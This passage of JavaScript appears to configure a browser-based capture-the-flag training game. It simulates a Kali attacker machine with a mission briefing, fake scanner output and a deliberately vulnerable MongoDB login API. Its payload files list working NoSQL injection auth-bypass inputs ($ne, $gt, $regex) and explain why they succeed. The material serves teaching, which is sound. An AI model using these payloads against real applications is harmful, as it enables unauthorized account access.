            <div style="color:#456b63; font-size:0.78rem; text-align:center; padding:12px; background:#071a17; border:1px solid #1a3a35; border-radius:4px;">
                Access Level: Read Only — No administrative functions available.
                <br><span style="color:#2a4a42; font-size:0.7rem;">You are authenticated as <strong>${A7Config._escHtml(user.username)}</strong>. To access admin features, try logging in as admin.</span>
            </div>
        `;
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (attacker machine — Kali)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'kali': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING ===\nTarget: 10.10.14.20 (The Hollow Database)\nFaction: Void Collective\nObjective: NoSQL Injection exploitation\n\nIntel:\n- Citizen Registry portal running MongoDB backend\n- API endpoint at /hollow/api/ leaks query format\n- No input sanitization on auth endpoint\n- Port 27017 is filtered — direct DB access blocked\n\nAttack steps:\n1. nmap scan to map services\n2. Browse the web app — check /hollow/ and /hollow/api/\n3. Identify the JSON query structure for authentication\n4. Craft NoSQL injection payload to bypass auth as admin\n5. Use admin panel to query vault_keys collection\n6. Retrieve both flags\n\nKey difference from SQL injection:\n- No quotes, no UNION SELECT\n- Instead: MongoDB operators like {\"$ne\":\"\"}\n- These get evaluated by the DB engine if unsanitized\n\nGood luck, operator.'
                                },
                                'payloads': {
                                    type: 'dir',
                                    children: {
                                        'nosqli.json': {
                                            type: 'file',
                                            content: '// Common NoSQL Injection payloads for MongoDB auth bypass\n// Use with: curl -X POST -H "Content-Type: application/json" -d \'PAYLOAD\' URL\n\n// Bypass via $ne (not-equal) — password is NOT empty string (always true)\n{"username":"admin","password":{"$ne":""}}\n\n// Bypass via $gt (greater-than) — password > empty string\n{"username":"admin","password":{"$gt":""}}\n\n// Bypass via $regex — password matches any pattern\n{"username":"admin","password":{"$regex":".*"}}\n\n// Return first document — both fields not empty\n{"username":{"$ne":""},"password":{"$ne":""}}\n\n// Target admin role explicitly\n{"username":"admin","password":{"$gte":""}}'
                                        },
                                        'operators.txt': {
                                            type: 'file',
                                            content: '=== MongoDB Query Operators Reference ===\n\n$ne   — Not Equal:       {"field": {"$ne": "value"}}\n$eq   — Equal:           {"field": {"$eq": "value"}}\n$gt   — Greater Than:    {"field": {"$gt": "value"}}\n$gte  — Greater or Eq:   {"field": {"$gte": "value"}}\n$lt   — Less Than:       {"field": {"$lt": "value"}}\n$lte  — Less or Eq:      {"field": {"$lte": "value"}}\n$regex — Regex Match:    {"field": {"$regex": "pattern"}}\n$in   — In Array:        {"field": {"$in": ["a","b"]}}\n$nin  — Not In Array:    {"field": {"$nin": ["a","b"]}}\n$exists — Field exists:  {"field": {"$exists": true}}\n\n=== Why These Bypass Auth ===\nIf the server runs: db.users.findOne(body)\nand body = {"username":"admin","password":{"$ne":""}}\nthen MongoDB evaluates: WHERE username=\'admin\' AND password != \'\'\nSince every real password is NOT empty, this is always true.\nResult: admin document returned WITHOUT knowing the password.'
                                        }
                                    }
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'nmap 10.10.14.20\ncurl http://10.10.14.20/hollow/\ncurl http://10.10.14.20/hollow/api/\nfirefox http://10.10.14.20/hollow/'
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'share': {
                            type: 'dir',
                            children: {
                                'wordlists': {
                                    type: 'dir',
                                    children: {
                                        'rockyou.txt': {
                                            type: 'file',
                                            content: '[rockyou.txt — 14,341,564 passwords — file too large to display]'
                                        },
                                        'dirb': {
                                            type: 'dir',
                                            children: {
                                                'common.txt': {
                                                    type: 'file',
                                                    content: 'admin\napi\nbackup\ncgi-bin\nconfig\ndashboard\ndata\ndb\nimages\nindex\nlogin\nphpmyadmin\nserver-status\ntest\nuploads'
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'kali'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash'
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (box-specific tools)
    // ═══════════════════════════════════════════════════════

    commands: {

        'nmap': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!target || target === '10.10.14.20') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.10.14.20
Host is up (0.028s latency).
Not shown: 998 closed tcp ports

PORT      STATE    SERVICE    VERSION
80/tcp    open     http       Apache httpd 2.4.57
27017/tcp filtered mongodb

80/tcp open http Apache httpd 2.4.57
| http-title: Void Collective — Citizen Registry
|_http-server-header: Apache/2.4.57

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 9.13 seconds`;
            }
            if (target === 'localhost' || target === '127.0.0.1') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00010s latency).
All 1000 scanned ports on localhost are closed.

Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds`;
            }
            return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds`;
        },

        'curl': function(args, term, engine) {
            const methodIdx = args.indexOf('-X');
            const method = methodIdx !== -1 ? args[methodIdx + 1] : 'GET';
            const dataIdx = args.indexOf('-d');
            const rawData = dataIdx !== -1 ? args[dataIdx + 1] : null;
            const url = args.find(a => a.startsWith('http')) || '';

            if (!url) return 'curl: try \'curl --help\' for more information';

            // ── API auth endpoint with JSON POST ──
            if (url.includes('10.10.14.20') && url.includes('/api/citizens/auth') && rawData) {
                let parsed = null;
                try {
                    // Handle shell-quoted data argument
                    const cleaned = rawData.replace(/^['"]|['"]$/g, '');
                    parsed = JSON.parse(cleaned);
                } catch (_) {
                    return '{"error":"MongoServerError: invalid JSON body"}';
                }
                const username = typeof parsed.username === 'string' ? parsed.username : JSON.stringify(parsed.username);
                const password = typeof parsed.password === 'string' ? parsed.password : JSON.stringify(parsed.password);
                const result = A7Config._handleLogin(username, password, engine);
                return A7Config._stripHtml(result);
            }

            // ── API citizen search endpoint ──
            if (url.includes('10.10.14.20') && url.includes('/api/citizens/search') && rawData) {
                const cleaned = rawData.replace(/^['"]|['"]$/g, '');
                const result = A7Config._handleCitizenSearch(cleaned, engine);
                return A7Config._stripHtml(result);
            }

            // ── GET pages ──
            if (url.includes('10.10.14.20') && url.includes('/hollow/api/')) {
                return `<!DOCTYPE html>
<html>
<head><title>Void Collective API Reference</title></head>
<body>
<h2>API Reference v1.4.2</h2>
<h3>POST /api/citizens/auth</h3>
<p>Accepts JSON: {"username": "...", "password": "..."}</p>
<p>NOTE: Passed directly to db.citizens.findOne(body)</p>
<p>Supported operators: $ne, $gt, $regex, $in, $nin, $exists</p>
<h3>POST /api/citizens/search</h3>
<p>Accepts JSON query object. Passed to db.citizens.find()</p>
</body>
</html>`;
            }

            if (url.includes('10.10.14.20') && url.includes('/hollow/')) {
                return `<!DOCTYPE html>
<html>
<head><title>Void Collective — Citizen Registry</title></head>
<body>
<h2>Citizen Registry — Authentication Portal v1.4.2</h2>
<form action="/api/citizens/auth" method="POST">
  <input name="username" placeholder="citizen_id">
  <input name="password" type="password">
  <button>Authenticate</button>
</form>
<p>Guest access: guest / visitor123</p>
<p>API endpoint: POST /api/citizens/auth (accepts JSON body)</p>
</body>
</html>`;
            }

            return `curl: (7) Failed to connect to ${url.replace(/https?:\/\//, '').split('/')[0] || 'host'}: Connection refused`;
        },

        'mongo': function(args, term, engine) {
            return `MongoDB shell version v6.0.4
connecting to: mongodb://10.10.14.20:27017/
Error: connect ECONNREFUSED 10.10.14.20:27017 failed
Mon Feb 17 03:41:09.712 Error: couldn't connect to server 10.10.14.20:27017, connection attempt failed: SocketException
exception: connect failed
exiting with code 1`;
        },

        'mongosh': function(args, term, engine) {
            return `Current Mongosh Log ID: 65a2c4f3b7e1d90012345678
Connecting to:          mongodb://10.10.14.20:27017/
MongoNetworkError: connect ECONNREFUSED 10.10.14.20:27017
(Use \\q to quit)`;
        },

        'ping': function(args) {
            const target = args[0] || '';
            if (!target) return 'Usage: ping [-c count] destination';
            if (target === '10.10.14.20') {
                return `PING 10.10.14.20 (10.10.14.20) 56(84) bytes of data.
64 bytes from 10.10.14.20: icmp_seq=1 ttl=64 time=28.3 ms
64 bytes from 10.10.14.20: icmp_seq=2 ttl=64 time=27.9 ms
64 bytes from 10.10.14.20: icmp_seq=3 ttl=64 time=28.5 ms

--- 10.10.14.20 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
rtt min/avg/max/mdev = 27.9/28.2/28.5/0.253 ms`;
            }
            return `ping: ${target}: Name or service not known`;
        },

        'nikto': function(args) {
            return `- Nikto v2.5.0
+ Target IP:       10.10.14.20
+ Target Hostname:  hollow.void-collective.ctf
+ Target Port:      80
+ Server: Apache/2.4.57 (Debian)
+ /hollow/: Application using MongoDB backend (X-Powered-By: Express)
+ /hollow/api/: API documentation accessible without authentication
+ /hollow/api/: Response leaks MongoDB operator support
+ Apache/2.4.57 appears to be outdated
+ OSVDB-3093: /hollow/dashboard/: Dashboard application found
+ 8 items checked: 4 findings`;
        },

        'gobuster': function(args) {
            return `Gobuster v3.6
[+] Url:            http://10.10.14.20/hollow/
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
===============================================================
/api/                (Status: 200) [Size: 3241]
/dashboard/          (Status: 302) [Redirect to: /hollow/]
/index.html          (Status: 200) [Size: 2108]
===============================================================
Finished`;
        },

        'dirb': function(args) {
            const target = args[0] || '';
            if (!target) return 'Usage: dirb <url_base> [<wordlist_file>]';
            return `---- Scanning URL: ${target} ----
+ ${target}/api/ (CODE:200|SIZE:3241)
+ ${target}/dashboard/ (CODE:302|SIZE:0)
+ ${target}/index.html (CODE:200|SIZE:2108)

---- Results ----
3 results found.`;
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    // Render a responsive table with teal accent headers
    _tableHtml(headers, rows) {
        let html = '<table style="width:100%; border-collapse:collapse; font-size:0.78rem;"><thead><tr>';
        headers.forEach(h => {
            html += `<th style="padding:6px 10px; text-align:left; color:#1abc9c; border-bottom:2px solid #1a3a35; background:#0d2420;">${h}</th>`;
        });
        html += '</tr></thead><tbody>';
        rows.forEach(row => {
            html += '<tr>';
            row.forEach(cell => {
                html += `<td style="padding:5px 10px; border-bottom:1px solid #0d2420; color:#e0f5f2;">${cell}</td>`;
            });
            html += '</tr>';
        });
        html += '</tbody></table>';
        return html;
    },

    // MongoDB-style error block with optional hint text
    _mongoErrHtml(errorMsg, hint, soft) {
        const hintBlock = hint
            ? `<div style="color:#7fa89e; font-size:0.7rem; margin-top:6px; padding-top:6px; border-top:1px solid #1a3a35;">${hint}</div>`
            : '';
        return `<div style="color:#e74c3c; background:rgba(231,76,60,0.07); border:1px solid rgba(231,76,60,0.2); border-radius:4px; padding:10px 14px; font-size:0.8rem; font-family:monospace;">
            <strong>${A7Config._escHtml(errorMsg)}</strong>${hintBlock}
        </div>`;
    },

    // Success/info notification block
    _successHtml(msg) {
        return `<div style="color:#1abc9c; background:rgba(26,188,156,0.07); border:1px solid rgba(26,188,156,0.2); border-radius:4px; padding:10px 14px; margin-top:10px; font-size:0.78rem;">${msg}</div>`;
    },

    // Neutral info block
    _infoHtml(msg) {
        return `<div style="color:#7fa89e; background:rgba(26,188,156,0.04); border:1px solid #1a3a35; border-radius:4px; padding:10px 14px; font-size:0.78rem;">${msg}</div>`;
    },

    // HTML-escape a string to prevent XSS in innerHTML contexts
    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = String(str);
        return div.innerHTML;
    },

    // Strip HTML tags and convert table structure to plain text (for terminal output)
    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        const tables = tmp.querySelectorAll('table');
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(row => {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(c => c.textContent.trim().padEnd(22));
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        return tmp.textContent.trim();
    }

};
